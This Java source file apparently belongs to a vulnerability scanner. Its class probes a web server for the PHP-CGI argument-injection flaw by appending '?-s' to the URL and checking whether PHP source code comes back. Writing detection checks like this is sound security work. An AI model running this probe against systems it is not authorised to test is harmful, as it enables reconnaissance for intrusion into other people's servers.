package com.funtap.awass.POC;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.io.IOException;
import java.net.SocketTimeoutException;
import java.util.Locale;

public class PHP_CGI_RCE {
    public boolean PHP_CGI_RCE(String cookie,String url ) throws IOException {
        if(url.endsWith("/"))
        url = url+"?-s";
        else
            url = url+"/?-s";
        String html = GetHtmlString(url,cookie);
        if(html.toLowerCase(Locale.ROOT).contains("<?php"))
            return true;
        else
        return false;
    }



    private String GetHtmlString(String url, String cookie) throws IOException {
        String html = "";
        if (cookie != null) {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            Request request = new Request.Builder()
                    .url((String) url)
                    .method("GET", null)
                    .addHeader("Cookie", cookie)
                    .build();
            boolean conn = true;
            Response response = null;
            while (conn) {
                try {
                    response = client.newCall(request).execute();
                    conn = false;
                } catch (SocketTimeoutException e) {
                    System.out.println("connecting ....");
                }
            }
            html = response.body().string();
        } else {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            Request request = new Request.Builder()
                    .url((String) url)
                    .method("GET", null)
                    .build();
            boolean conn = true;
            Response response = null;
            while (conn) {
                try {
                    response = client.newCall(request).execute();
                    conn = false;
                } catch (SocketTimeoutException e) {
                    System.out.println("connecting ....");
                }
            }
            html = response.body().string();
        }


        return html;
    }
}
